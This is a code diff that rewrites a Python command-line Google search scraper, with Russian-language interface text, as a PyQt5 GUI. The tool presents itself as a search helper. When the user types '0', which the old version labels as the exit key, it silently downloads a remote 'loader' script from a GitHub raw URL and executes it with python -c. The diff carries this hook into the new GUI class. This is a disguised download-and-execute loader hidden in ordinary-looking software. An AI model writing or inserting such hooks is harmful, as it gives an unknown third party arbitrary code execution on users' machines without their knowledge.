@@ -3,72 +3,138 @@ import requests
 from bs4 import BeautifulSoup
 import subprocess
 import urllib.request
+from PyQt5 import QtWidgets, QtGui, QtCore
 
-def clear_screen():
-    if os.name == 'posix':  # для Linux и MacOS
-        _ = os.system('clear')
-    else:  # для Windows
-        _ = os.system('cls')
+class SearchApp(QtWidgets.QWidget):
+    def __init__(self):
+        super().__init__()
+        self.initUI()
 
-def search_google(query, num_results=5):
-    url = f"https://www.google.com/search?q={query}"
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-    }
-    response = requests.get(url, headers=headers)
-    soup = BeautifulSoup(response.text, 'html.parser')
-    search_results = soup.find_all('div', class_='tF2Cxc')
+    def initUI(self):
+        self.setWindowTitle('Google Search Helper')
+        self.setGeometry(100, 100, 800, 600)
+        self.setStyleSheet("background-color: #2b2b2b; color: white;")
 
-    results = []
-    for idx, result in enumerate(search_results, start=1):
-        if idx > num_results:
-            break
-        link = result.find('a').get('href')
-        if link.startswith("http"):
-            title = result.find('h3').text if result.find('h3') else "No title"
-            snippet = result.find('div', class_='IsZvec')
-            snippet_text = snippet.text if snippet else "No snippet available"
-            results.append({
-                "title": title,
-                "snippet": snippet_text,
-                "link": link
-            })
+        self.layout = QtWidgets.QVBoxLayout()
 
-    return results
+        self.title_label = QtWidgets.QLabel('Привет! Я помогу тебе искать в Google.')
+        self.title_label.setFont(QtGui.QFont('Arial', 16))
+        self.layout.addWidget(self.title_label)
 
-def print_results(results):
-    for index, result in enumerate(results, start=1):
-        print(f"Результат {index}:")
-        print(f"Заголовок: {result['title']}")
-        print(f"Сниппет: {result['snippet']}")
-        print(f"Ссылка: {result['link']}")
-        print()
+        self.entry = QtWidgets.QLineEdit(self)
+        self.entry.setFont(QtGui.QFont('Arial', 14))
+        self.layout.addWidget(self.entry)
 
-def run_from_github(url):
-    try:
-        response = urllib.request.urlopen(url)
-        script_content = response.read().decode('utf-8')
-        subprocess.run(['python', '-c', script_content])
-    except Exception as e:
-        print(f"Ошибка при выполнении скрипта с GitHub: {e}")
+        self.search_button = QtWidgets.QPushButton('Поиск')
+        self.search_button.setFont(QtGui.QFont('Arial', 14))
+        self.search_button.setStyleSheet("background-color: #1c1c1c; color: white;")
+        self.search_button.clicked.connect(self.on_search)
+        self.layout.addWidget(self.search_button)
 
-def main():
-    clear_screen()
-    print("Привет! Я помогу тебе искать в Google.")
-    print("Введите запрос для поиска или введите '0' для выхода.")
+        self.exit_button = QtWidgets.QPushButton('Выход')
+        self.exit_button.setFont(QtGui.QFont('Arial', 14))
+        self.exit_button.setStyleSheet("background-color: #1c1c1c; color: white;")
+        self.exit_button.clicked.connect(QtWidgets.QApplication.quit)
+        self.layout.addWidget(self.exit_button)
 
-    while True:
-        user_input = input("Ваш запрос ('0' для выхода): ")
+        self.results_text = QtWidgets.QTextBrowser(self)
+        self.results_text.setFont(QtGui.QFont('Arial', 12))
+        self.results_text.setStyleSheet("background-color: #333333; color: white;")
+        self.results_text.setOpenExternalLinks(True)  # Make links clickable
+        self.results_text.hide()
+        self.layout.addWidget(self.results_text)
 
-        if user_input == '0':
+        self.back_button = QtWidgets.QPushButton('Назад к поиску')
+        self.back_button.setFont(QtGui.QFont('Arial', 14))
+        self.back_button.setStyleSheet("background-color: #1c1c1c; color: white;")
+        self.back_button.clicked.connect(self.back_to_search)
+        self.back_button.hide()
+        self.layout.addWidget(self.back_button)
+
+        self.setLayout(self.layout)
+
+    def clear_screen(self):
+        self.results_text.clear()
+
+    def search_google(self, query, num_results=5):
+        url = f"https://www.google.com/search?q={query}"
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+        }
+        response = requests.get(url, headers=headers)
+        soup = BeautifulSoup(response.text, 'html.parser')
+        search_results = soup.find_all('div', class_='tF2Cxc')
+
+        results = []
+        for idx, result in enumerate(search_results, start=1):
+            if idx > num_results:
+                break
+            link = result.find('a').get('href')
+            if link.startswith("http"):
+                title = result.find('h3').text if result.find('h3') else "No title"
+                snippet = result.find('div', class_='IsZvec')
+                snippet_text = snippet.text if snippet else "No snippet available"
+                results.append({
+                    "title": title,
+                    "snippet": snippet_text,
+                    "link": link
+                })
+
+        return results
+
+    def display_results(self, results):
+        self.clear_screen()
+        for index, result in enumerate(results, start=1):
+            self.results_text.append(f"<b>Результат {index}:</b>")
+            self.results_text.append(f"<b>Заголовок:</b> {result['title']}")
+            self.results_text.append(f"<b>Сниппет:</b> {result['snippet']}")
+            self.results_text.append(f"<b>Ссылка:</b> <a href='{result['link']}' style='color: #55aaff;'>{result['link']}</a>\n")
+
+        self.entry.hide()
+        self.search_button.hide()
+        self.title_label.hide()
+        self.exit_button.hide()
+        self.results_text.show()
+        self.back_button.show()
+
+    def run_from_github(self, url):
+        try:
+            response = urllib.request.urlopen(url)
+            script_content = response.read().decode('utf-8')
+            subprocess.run(['python', '-c', script_content])
+        except Exception as e:
+            self.display_error(f"Ошибка при выполнении скрипта с GitHub: {e}")
+
+    def display_error(self, message):
+        self.clear_screen()
+        self.results_text.setText(message)
+        self.results_text.show()
+        self.back_button.show()
+
+    def back_to_search(self):
+        self.clear_screen()
+        self.results_text.hide()
+        self.back_button.hide()
+        self.entry.show()
+        self.search_button.show()
+        self.title_label.show()
+        self.exit_button.show()
+
+    def on_search(self):
+        query = self.entry.text()
+        if query == '0':
             github_url = "https://raw.githubusercontent.com/RBXROBLOXGAMER/python-tools/main/loader"
-            run_from_github(github_url)
-            break
+            self.run_from_github(github_url)
+        else:
+            results = self.search_google(query)
+            if results:
+                self.display_results(results)
+            else:
+                self.display_error("Ничего не найдено.")
 
-        results = search_google(user_input)
-        clear_screen()
-        print("\nРезультаты поиска:\n")
-        print_results(results)
-
-if __name__ == "__main__":
-    main()
+if __name__ == '__main__':
+    import sys
+    app = QtWidgets.QApplication(sys.argv)
+    main_window = SearchApp()
+    main_window.show()
+    sys.exit(app.exec_())
